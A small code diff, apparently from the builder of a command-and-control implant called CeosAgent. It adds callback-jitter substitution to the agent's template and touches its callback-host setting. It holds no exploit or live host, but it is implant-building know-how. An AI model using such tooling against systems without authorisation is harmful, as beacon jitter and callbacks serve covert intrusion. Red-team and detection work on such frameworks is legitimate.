@@ -44,7 +44,7 @@ class CeosAgent(PayloadType):
         resp = BuildResponse(status=BuildStatus.Success)
         Config = {
             "payload_uuid": self.uuid,
-            "callback_host": "",
+            "callback_host": "", 
             "USER_AGENT": "",
             "httpMethod": "POST",
             "post_uri": "",
@@ -100,6 +100,7 @@ class CeosAgent(PayloadType):
                 content = content.replace("%SSL%", "FALSE")
             content = content.replace("%PORT%", str(Config["callback_port"]))
             content = content.replace("%SLEEPTIME%", str(Config["callback_interval"]))
+            content = content.replace("%JITTER%", str(Config["callback_jitter"]))
             content = content.replace("%USERAGENT%", Config["USER_AGENT"])
             content = content.replace("%PROXYURL%", Config["proxy_host"])
             if Config["proxyEnabled"]:
